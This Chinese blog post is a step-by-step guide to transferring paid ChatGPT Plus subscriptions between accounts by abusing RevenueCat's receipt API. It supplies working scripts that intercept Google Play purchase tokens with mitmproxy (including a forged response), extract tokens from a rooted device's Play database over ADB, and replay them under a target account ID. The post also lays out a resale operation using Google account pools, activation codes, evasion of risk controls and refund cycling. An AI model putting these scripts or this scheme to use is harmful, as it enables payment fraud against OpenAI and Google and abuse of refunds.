---
title: "GPT Plus 订阅转移全解析 - 从 Google Play Token 到一键开通的完整技术链路"
description: "深度剖析 GPT Plus Android 订阅架构：Google Play purchase token 如何通过 RevenueCat 中间层实现跨账号转移，从原理到 ADB 提取、MITM 拦截、API 调用的完整实战指南。"
date: 2026-07-17T16:00:00+08:00
draft: false
categories: ["安全研究", "支付安全", "技术科普"]
tags: ["ChatGPT", "GPT Plus", "Google Play", "RevenueCat", "订阅转移", "Android", "ADB", "MITM", "Python"]
---

{{< figure src="/images/wechat-qr.jpg" alt="微信二维码" width="200" >}}
**联系方式 & 交流群**

- **QQ**: 46333839
- **微信**: GOV-HACK

添加微信进微信交流群，各位觉得文章对你有帮助的话可否打赏一些呀~

---

## 前言

之前写了两篇关于 GPT Plus 的漏洞分析：一篇是 [iOS 收据复用](../gpt-plus-receipt-vulnerability-2026)，一篇是 [Google Play offerToken 替换实现 0 元订阅](../gpt-plus-exploit-revenuecat-vulnerability)。

今天这篇不一样——我们不搞 0 元白嫖，也不搞收据复用。今天讲的是一个更优雅的思路：**订阅转移**。

简单说就是：A 账号在 Google Play 上正经花钱买了 Plus，但通过技术手段，**把这个订阅"转"给 B 账号**。B 账号什么都没付，直接变 Plus。

听起来玄乎？其实原理简单得令人发指。往下看。

> **免责声明**：本文仅供安全研究与技术交流。未经授权的行为可能违反相关法律法规，请勿用于非法用途。

---

## 一、核心原理：为什么能"转移"？

### ChatGPT Android 的订阅架构

很多人以为 GPT 的订阅是 OpenAI 自己处理的。**不是。**

Android 端的订阅走的是这条链路：

```
Google Play 支付（扣钱）
    ↓ 生成 purchase token
ChatGPT App 拿到 token
    ↓ 发送到 RevenueCat
RevenueCat 验证 token
    ↓ 通知 OpenAI
OpenAI 后端开通 Plus
```

中间有个关键角色：**RevenueCat**。它是一个第三方订阅管理平台，充当 Google Play 和 OpenAI 之间的"中间人"。

### 漏洞在哪？

RevenueCat 的核心 API 是 `POST /v1/receipts`，请求体长这样：

```json
{
  "fetch_token": "<Google Play 的购买凭证>",
  "app_user_id": "<OpenAI 的账户 ID>",
  "product_ids": ["oai.chatgpt.plus"]
}
```

注意这两个参数：

| 参数 | 含义 | 来源 |
|------|------|------|
| `fetch_token` | 购买凭证，证明"有人付了钱" | Google Play 支付后返回 |
| `app_user_id` | 账户 ID，决定"给谁开通" | OpenAI 的 account_id |

**这两个参数是完全独立的。**

Google Play 只管"收钱并出具凭证"——它不关心这个凭证最终给谁用。RevenueCat 只管"验证凭证并绑定到指定用户"——它不检查 `app_user_id` 是否就是付钱的那个人。

打个比方：你在肯德基买了个汉堡，小票给了你朋友，你朋友拿小票去柜台，柜员一扫码——嗯，小票是真的，给。至于小票是不是你朋友买的？柜员根本不看。

**所以：用 A 的 token + B 的 account_id = 给 B 开 Plus。**

这就是"订阅转移"的全部原理。

---

## 二、关键标识符一览

在动手之前，先搞清楚几个关键 ID：

| 标识符 | 说明 | 长啥样 | 怎么拿 |
|--------|------|--------|--------|
| **fetch_token** | Google Play 购买凭证 | `iekllednimgnlmo...`（很长一串） | 支付后拦截/ADB 提取 |
| **app_user_id** | OpenAI 账户 ID | `f211fe99-83d9-4c48-b016-ee08984a592a` | 调 accounts/check API |
| **RevenueCat API Key** | RC 公钥（固定值） | `goog_DPguJtknNxbQBStStwhWGRsghUw` | 抓包可得，下面直接给你 |
| **product_id** | 订阅产品标识（固定值） | `oai.chatgpt.plus` | 固定的 |

---

## 三、获取 purchase token（两种姿势）

Token 是核心。拿到 token，后面的事就水到渠成了。这里提供两种获取方式，难度由低到高。

### 方式一：MITM 代理拦截（推荐，无需 Root）

**原理**：在 Android 设备和 RevenueCat 服务器之间架一层代理，支付完成后 ChatGPT App 会把 token 发给 RevenueCat，我们在中间截下来。

**你需要准备**：
- Android 设备（真机或模拟器，需装 Google Play 服务）
- 已登录的 Google 账号（需有支付方式或免费试用资格）
- ChatGPT App
- MITM 代理工具（推荐 Reqable / mitmproxy / Charles）

**步骤**：

**Step 1**：设备连接代理，安装并信任 MITM 证书。

**Step 2**：在代理工具中设置拦截规则：

```
URL 匹配: api.revenuecat.com/v1/receipts
请求方法: POST
动作:     拦截请求（Block）
```

**Step 3**：打开 ChatGPT App，用一个**临时账号**登录（不是目标账号！）。

**Step 4**：进入订阅页面 → 选择 Plus → 完成 Google Play 支付。

**Step 5**：支付完成后，代理工具会拦截到 `POST /v1/receipts` 请求。从请求体中提取 `fetch_token` 字段，保存。

**Step 6**：**阻断该请求**，不让它发到 RevenueCat。

为什么要阻断？因为如果让请求正常到达 RevenueCat，token 就会被"消费"掉，绑定到临时账号上，就没法转移了。

> **时间窗口**：token 拦截后有 **72 小时**有效期。超时未被 Acknowledge，Google Play 会自动退款。所以别拖太久。

如果你用 mitmproxy，这里有个现成的拦截脚本：

```python
# mitm_intercept.py — 自动拦截并保存 token
import json, time
from mitmproxy import http

TOKEN_FILE = "tokens.jsonl"

class RevenueCatInterceptor:
    def request(self, flow: http.HTTPFlow):
        if (flow.request.pretty_url.endswith("/v1/receipts")
            and flow.request.method == "POST"):
            try:
                body = json.loads(flow.request.get_text())
                fetch_token = body.get("fetch_token", "")
                if fetch_token:
                    record = {
                        "fetch_token": fetch_token,
                        "original_user_id": body.get("app_user_id", ""),
                        "captured_at": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
                        "used": False
                    }
                    with open(TOKEN_FILE, "a") as f:
                        f.write(json.dumps(record) + "\n")
                    print(f"[+] Token captured: {fetch_token[:40]}...")

                    # 返回伪造响应，阻断真实请求
                    flow.response = http.Response.make(
                        200,
                        json.dumps({"subscriber": {"entitlements": {}}}),
                        {"Content-Type": "application/json"}
                    )
            except Exception as e:
                print(f"[-] Parse error: {e}")

addons = [RevenueCatInterceptor()]
# 启动: mitmproxy -s mitm_intercept.py -p 8888
```

跑起来之后，每次支付完成，token 就自动保存到 `tokens.jsonl`，一条一行，干净利落。

### 方式二：ADB 直读 Google Play 数据库（需要 Root）

**原理**：Google Play 的购买记录存在本地 SQLite 数据库 `library.db` 里。Root 设备可以直接把数据库拉出来，用 SQL 查 token。

这个方法的好处是**不需要实时拦截**——支付完成后随时都能提取。坏处是需要 Root。

**完整提取脚本**：

```python
"""
read_purchase_token.py
通过 ADB 从 Google Play library.db 读取 ChatGPT 购买 Token
"""
import os, json, time, sqlite3, tempfile, subprocess

OUTPUT_FILE = "purchases.txt"
DB_SRC      = "/data/data/com.android.vending/databases/library.db"
DB_SDCARD   = "/sdcard/.tmp_read_token.db"
DEVICE_SERIAL = ""  # 留空自动选第一台设备

def adb(*args, timeout=15):
    cmd = ["adb"]
    if DEVICE_SERIAL:
        cmd += ["-s", DEVICE_SERIAL]
    cmd += list(args)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.returncode, (r.stdout + r.stderr).strip()
    except FileNotFoundError:
        return -1, "adb not found"

def read_token():
    tmp_path = None
    try:
        # Step 1: 用 root 权限把数据库复制到 sdcard
        code, out = adb("shell",
            f"su -c 'cp {DB_SRC} {DB_SDCARD} && chmod 644 {DB_SDCARD} && echo DONE'")
        if code != 0 or "DONE" not in out:
            print("复制失败，请确认设备已 Root")
            return

        # Step 2: pull 到本地
        _, tmp_path = tempfile.mkstemp(suffix=".db")
        adb("pull", DB_SDCARD, tmp_path)

        # Step 3: SQLite 查询
        conn = sqlite3.connect(tmp_path)
        cur  = conn.cursor()

        # 自动识别表结构
        cur.execute("PRAGMA table_info(ownership)")
        cols = [r[1] for r in cur.fetchall()]

        # 找 JSON 数据列
        json_candidates = ["inapp_purchase_data", "purchase_data", "value", "data"]
        json_col = next((c for c in json_candidates if c in cols), None)
        doc_col  = "doc_id" if "doc_id" in cols else cols[3]

        # 查 ChatGPT 相关购买记录
        sql = f"""
            SELECT account, {doc_col}, {json_col}
            FROM ownership
            WHERE ({doc_col} LIKE '%openai%' OR {doc_col} LIKE '%chatgpt%')
              AND {json_col} IS NOT NULL
            ORDER BY rowid DESC
        """
        rows = cur.execute(sql).fetchall()
        conn.close()

        # Step 4: 解析并保存 token
        saved = set()
        for row in rows:
            email    = str(row[0]) if row[0] else "unknown"
            raw_json = str(row[2]) if row[2] else ""
            if "purchaseToken" not in raw_json:
                continue
            data  = json.loads(raw_json)
            token = data.get("purchaseToken", "")
            order = data.get("orderId", "")
            if not token or token in saved:
                continue
            saved.add(token)

            entry = f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {email} | {order} | {token}\n"
            with open(OUTPUT_FILE, "a") as f:
                f.write(entry)
            print(f"邮箱: {email}")
            print(f"Order: {order}")
            print(f"Token: {token[:60]}...")
            print(f"已保存 -> {OUTPUT_FILE}")

        print(f"共保存 {len(saved)} 条")
    finally:
        if tmp_path:
            os.unlink(tmp_path)
        adb("shell", f"rm -f {DB_SDCARD}")

if __name__ == "__main__":
    read_token()
```

**这段代码做了什么？**

一步步拆解：

1. **`su -c 'cp ...'`** — Google Play 的数据库在 `/data/data/com.android.vending/` 下，普通权限读不了，必须用 `su`（Root）复制到 sdcard
2. **`adb pull`** — 把数据库从手机拉到电脑上
3. **SQLite 查询** — `ownership` 表存了所有购买记录，用 `LIKE '%chatgpt%'` 过滤出 ChatGPT 相关的
4. **JSON 解析** — 购买数据是 JSON 格式存的，里面有 `purchaseToken` 和 `orderId`

数据库的 `ownership` 表结构大概长这样：

| 列名 | 类型 | 说明 |
|------|------|------|
| account | TEXT | Google 账号邮箱 |
| doc_id | TEXT | 应用包名+产品ID |
| inapp_purchase_data | TEXT | JSON 格式的购买数据 |

JSON 里面关键字段：

```json
{
  "orderId": "GPA.3305-3747-1234-56789",
  "packageName": "com.openai.chatgpt",
  "productId": "oai.chatgpt.plus",
  "purchaseTime": 1720000000000,
  "purchaseState": 0,
  "purchaseToken": "iekllednimgnlmo...（很长一串）",
  "quantity": 1,
  "acknowledged": false,
  "autoRenewing": true
}
```

**`purchaseToken`** 就是我们要的东西。拿到它，就能"转移"订阅。

---

## 四、获取目标账号的 account_id

Token 到手了，接下来要知道"转给谁"——也就是目标 GPT 账号的 `account_id`。

**API 调用**：

```
GET https://android.chat.openai.com/backend-api/accounts/check/v4-2023-04-27
Authorization: Bearer <目标账号的 JWT Token>
```

响应里有个 `account_id` 字段，UUID 格式：

```json
{
  "account_id": "f211fe99-83d9-4c48-b016-ee08984a592a",
  "email": "target@example.com",
  ...
}
```

**怎么拿 JWT Token？**

最简单的方式：浏览器登录 ChatGPT → 访问 `https://chatgpt.com/api/auth/session` → 响应里有 `accessToken`。

或者直接让用户给你 Session JSON，你从里面解析 `account.id`。

---

## 五、执行转移

Token 有了，account_id 有了，最后一步：调 RevenueCat API，把 token 绑到目标账号上。

### 完整转移脚本

```python
import requests
import json

url = "https://api.revenuecat.com/v1/receipts"

headers = {
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 16; Pixel 9 Build/BP4A.260205.001)",
    "Content-Type": "application/json",
    "X-Platform": "android",
    "X-Platform-Flavor": "native",
    "X-Platform-Version": "36",
    "X-Version": "9.22.1",
    "X-Client-Bundle-ID": "com.openai.chatgpt",
    "X-Observer-Mode-Enabled": "false",
    "X-Custom-Entitlements-Computation": "true",
    "X-Storefront": "US",
    "Authorization": "Bearer goog_DPguJtknNxbQBStStwhWGRsghUw",
    "X-RevenueCat-ETag": ""
}

data = {
    "fetch_token": "<你拿到的 purchase token>",
    "product_ids": ["oai.chatgpt.plus"],
    "platform_product_ids": [{"product_id": "oai.chatgpt.plus"}],
    "app_user_id": "<目标账号的 account_id>",
    "is_restore": True,
    "observer_mode": False,
    "purchase_completed_by": "revenuecat",
    "initiation_source": "unsynced_active_purchases",
    "sdk_originated": False,
    "payload_version": 1
}

response = requests.post(url, headers=headers, data=json.dumps(data, separators=(',', ':')))

if response.status_code == 200:
    result = response.json()
    subscriber = result.get("subscriber", {})
    entitlements = subscriber.get("entitlements", {})
    subscriptions = subscriber.get("subscriptions", {})

    if "chatgpt_plus" in entitlements:
        ent = entitlements["chatgpt_plus"]
        print("=" * 50)
        print("充值成功！")
        print("=" * 50)
        print(f"  账号 ID     : {subscriber.get('original_app_user_id')}")
        print(f"  到期时间   : {ent.get('expires_date')}")
        print(f"  产品标识   : {ent.get('product_identifier')}")

        for pid, sub in subscriptions.items():
            price = sub.get("price", {})
            print(f"  价格       : {price.get('amount', '?')} {price.get('currency', '')}")
            print(f"  订阅类型   : {sub.get('period_type')}")
            print(f"  是否沙盒   : {'是' if sub.get('is_sandbox') else '否'}")
    else:
        print("未找到 chatgpt_plus 权益，可能失败了")
        print(json.dumps(result, indent=2, ensure_ascii=False))
else:
    print(f"请求失败: {response.status_code}")
    print(response.text)
```

### 逐行拆解

**Headers 部分**：

```python
"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 16; Pixel 9 Build/...)"
```
伪装成 Android 设备的 ChatGPT App。RevenueCat 会检查 User-Agent，用浏览器的 UA 会被拒。

```python
"Authorization": "Bearer goog_DPguJtknNxbQBStStwhWGRsghUw"
```
**这不是用户的 token**，这是 RevenueCat 的 **公共 API Key**。每个使用 RevenueCat 的 App 都有一个，固定不变的。ChatGPT Android 的公钥就是这个。

**Body 部分**：

```python
"fetch_token": "<purchase token>"   # 第三步拿到的购买凭证
"app_user_id": "<account_id>"       # 第四步拿到的目标账号 ID
"is_restore": True                  # 告诉 RC 这是"恢复购买"，不是新购买
"initiation_source": "unsynced_active_purchases"  # 来源标记
```

`is_restore: True` 是个关键细节——它告诉 RevenueCat "这不是一次新购买，而是恢复一个已有的购买"。这样 RC 不会创建新的订阅记录，而是把已有的 token 绑定到 `app_user_id` 指定的账号上。

### 成功响应长啥样？

```json
{
  "subscriber": {
    "entitlements": {
      "chatgpt_plus": {
        "expires_date": "2026-08-17T07:13:32Z",
        "product_identifier": "oai.chatgpt.plus",
        "purchase_date": "2026-07-17T07:13:32Z"
      }
    },
    "subscriptions": {
      "oai.chatgpt.plus": {
        "period_type": "trial",
        "price": { "amount": 0.0, "currency": "JPY" },
        "store": "play_store",
        "expires_date": "2026-08-17T07:13:32Z"
      }
    },
    "management_url": "https://play.google.com/store/account/subscriptions?..."
  }
}
```

看到 `entitlements` 里有 `chatgpt_plus`，就说明**转移成功**了。`expires_date` 是到期时间。

---

## 六、完整流程图

```
┌─────────────────────────────────────────────────────┐
│                  Phase 1: Token 获取                │
│                                                     │
│  方式A: MITM 拦截                                   │
│    Android + ChatGPT + Reqable/mitmproxy            │
│    完成 Google Play 支付                            │
│    拦截 POST /v1/receipts → 提取 fetch_token        │
│    阻断请求 → 保存 token (72h 有效)                 │
│                                                     │
│  方式B: ADB 直读                                    │
│    Root 设备 + ADB                                  │
│    读取 library.db → ownership 表                   │
│    解析 JSON → 提取 purchaseToken                   │
└───────────────────────┬─────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────┐
│                  Phase 2: Token 使用                │
│                                                     │
│  获取目标账号 account_id                            │
│    GET /backend-api/accounts/check                  │
│    或从 Session JSON 解析                           │
│        ↓                                            │
│  POST /v1/receipts                                  │
│    fetch_token = 保存的 token                       │
│    app_user_id = 目标 account_id                    │
│    Authorization = RC 公钥                          │
│        ↓                                            │
│  RevenueCat 验证 → 通知 OpenAI → Plus 开通          │
└─────────────────────────────────────────────────────┘
```

---

## 七、规模化：从手动到自动

手动操作一两个账号没问题，但如果要做成服务呢？这就涉及到工程化了。

### 架构设计

一个完整的自动化系统大概长这样：

```
┌──────────┐     ┌────────────┐     ┌────────────┐
│ Google   │     │  拦截层    │     │  Token     │
│ 账号池   │────▶│ mitmproxy  │────▶│  队列      │
│          │     │  + ADB     │     │ (FIFO)     │
└──────────┘     └────────────┘     └─────┬──────┘
                                          │
                                          ▼
┌──────────┐     ┌────────────┐     ┌────────────┐
│ 目标     │     │  充值 API  │     │  CDK       │
│ 账号     │◀────│  自动提交  │◀────│  卡密系统  │
│          │     │  RC 调用   │     │            │
└──────────┘     └────────────┘     └────────────┘
```

**核心组件**：

| 组件 | 职责 | 技术栈 |
|------|------|--------|
| **Google 账号池** | 存储可用的 Google 账号 | 数据库 |
| **ADB 自动化** | 自动完成 Play 支付流程 | Python + ADB |
| **Token 队列** | 缓存未使用的 purchase token | 数据库/消息队列 |
| **CDK 卡密系统** | 发放激活码给终端用户 | Web 应用 |
| **充值 API** | 接收用户 Session，调用 RC 完成开通 | 后端服务 |

### 数据库设计

核心就三张表：

**google_credential** — 记录每次 Google Play 购买：

| 字段 | 说明 |
|------|------|
| google_email | Google 账号 |
| order_id | 订单号 |
| purchase_token | 购买凭证 |
| product_id | 产品标识 |
| acknowledged | 是否已确认 |
| status | 状态（未使用/已使用/已退款） |
| card_key_id | 关联的 CDK |

**card_key** — CDK 卡密：

| 字段 | 说明 |
|------|------|
| card_key | 16位激活码 |
| product_id | 对应产品 |
| credential_id | 关联的购买凭证 |
| status | 状态（待使用/已使用/已禁用） |

**redeem_record** — 充值记录：

| 字段 | 说明 |
|------|------|
| card_key | 使用的激活码 |
| external_account_id | 目标 GPT 账号 ID |
| status | 结果（成功/失败） |
| expires_date | 订阅到期时间 |

### 用户端流程

做成产品后，终端用户看到的是这样的流程：

```
用户拿到 CDK 激活码
    ↓
打开充值页面，输入激活码
    ↓
系统验证激活码有效性
    ↓
用户粘贴自己的 ChatGPT Session JSON
    ↓
系统解析 Session，提取 account_id
    ↓
系统从 Token 队列取一个 token
    ↓
调用 RevenueCat API 完成转移
    ↓
返回充值结果（成功/失败 + 到期时间）
```

用户全程不需要知道底层发生了什么。他只需要：
1. 输入激活码
2. 粘贴 Session
3. 等几秒钟

---

## 八、风控与注意事项

### 时间约束

| 约束 | 时限 | 后果 |
|------|------|------|
| Token 未 Acknowledge | **72 小时** | Google Play 自动退款 |
| RC 提交后自动 Acknowledge | 立即 | Token 被消费，无法再用 |

**所以**：token 拦截后必须在 3 天内使用。提交给 RevenueCat 后就立即被 Acknowledge，相当于"消费"掉了。

### 一 token 一账号

purchase token 一旦提交给 RevenueCat 并被 Acknowledge，就标记为"已消费"。**不能重复使用**。一次支付 = 一个 token = 开通一个账号。

这跟之前 iOS 收据复用漏洞不同——iOS 那个是同一张收据能反复用，Android 这个不行。

### X-Post-Params-Hash

抓包时你可能注意到请求头里有个 `X-Post-Params-Hash`，格式：

```
app_user_id,fetch_token:sha256:<hash值>
```

这个是 `app_user_id` 和 `fetch_token` 拼接后的 SHA256。换了 account_id 后需要重新算。

**但经过实测**：服务端不校验这个值。随便填或者留空都不影响结果。RevenueCat 可能是为了调试保留的字段，并没有做服务端校验。

同样，`X-Nonce` 这个字段也不校验。

### 风控分析

| 风控点 | 风险 | 说明 |
|--------|------|------|
| RevenueCat 服务端 | **低** | 只验 token 真假，不检查 app_user_id 匹配 |
| Google Play 退款检测 | **中** | 频繁退款/争议可能被 Google 封号 |
| OpenAI 行为分析 | **低** | OpenAI 后端只看 RC 返回的订阅状态 |
| Google 账号风控 | **中** | 同一账号频繁订阅/退订会被标记 |

### Google 账号消耗

如果走的是**免费试用**路径（`period_type: "trial"`, `price: 0.0`）：

- 每个 Google 账号对 `oai.chatgpt.plus` 只有 **1 次**免费试用机会
- 试用后该账号永久标记为"已使用试用"
- **N 个 token 需要 N 个 Google 账号**

如果走的是**付费订阅**路径：

- Token 被拦截未 Acknowledge → 72h 后自动退款 → 理论上可重新购买
- 但频繁操作会触发 Google 风控
- 建议每个账号不超过 3-5 次循环

---

## 九、与 iOS 收据漏洞的对比

很多人会把这个和 iOS 收据复用搞混，这里做个对比：

| 维度 | iOS 收据复用 | Android Token 转移 |
|------|-------------|-------------------|
| **支付平台** | App Store | Google Play |
| **中间层** | 直接对接 OpenAI | 经过 RevenueCat |
| **核心资产** | iOS receipt（Base64） | purchase token |
| **能否复用** | 能，一张收据开无数账号 | 不能，一个 token 只能用一次 |
| **成本模型** | 一次付费 → 无限开通 | 一次付费 → 一次开通 |
| **获取难度** | 需要 iOS 设备 + 拦截 | Android + MITM 或 Root |
| **修复状态** | 部分修复 | 未修复 |

Android 这个转移漏洞的成本比 iOS 高（每开一个账号都需要一个新 token），但胜在**稳定**——因为它利用的是 RevenueCat 的设计缺陷，不是简单的验证遗漏，修起来牵涉面更广。

---

## 十、总结

整条攻击链路其实非常清晰：

```
Google Play 支付 → 拦截 purchase token → 阻断 RevenueCat 回调
                                            ↓
目标账号 account_id ← Session 解析 ← 用户提交
                                            ↓
POST /v1/receipts (token + account_id) → RevenueCat 验证
                                            ↓
                                       OpenAI 开通 Plus
```

**漏洞本质**：RevenueCat 作为订阅中间层，在验证 purchase token 时不检查 `app_user_id` 与实际付款人的对应关系。它只关心两件事：token 是不是真的、token 有没有被用过。至于"谁付的钱"和"给谁开通"是不是同一个人——它不在乎。

**为什么 OpenAI 不修？** 大概率不是不能修，而是不值得。要修这个洞，要么放弃 RevenueCat 自建订阅系统（工程量巨大），要么在 RevenueCat 侧增加 app_user_id 校验（需要 RC 配合改 API）。对于一个 B 端收入占大头的公司来说，个人订阅的漏洞优先级确实不高。

**技术要点回顾**：

1. **架构理解** — Google Play → RevenueCat → OpenAI 三层解耦
2. **Token 获取** — MITM 拦截（简单）或 ADB 直读 library.db（需 Root）
3. **account_id** — 从 `/accounts/check` API 或 Session JSON 获取
4. **API 调用** — `POST /v1/receipts` 携带 token + account_id
5. **时间窗口** — 72 小时，过期自动退款

最后提醒：**本文仅供技术研究和安全交流**。Google Play 订阅体系的安全性问题是一个值得关注的研究方向，但请不要将本文技术用于非法用途。

---

## 参考资料

- [RevenueCat 官方文档 - POST /v1/receipts](https://docs.revenuecat.com/)
- [Google Play Billing Library 安全最佳实践](https://developer.android.com/google/play/billing/security)
- [OWASP Mobile Top 10](https://owasp.org/www-project-mobile-top-10/)
- [mitmproxy 官方文档](https://docs.mitmproxy.org/)
- [Android Debug Bridge (ADB) 文档](https://developer.android.com/tools/adb)

---

**标签**: #ChatGPT #GPTPlus #GooglePlay #RevenueCat #订阅转移 #Android #支付安全 #技术科普
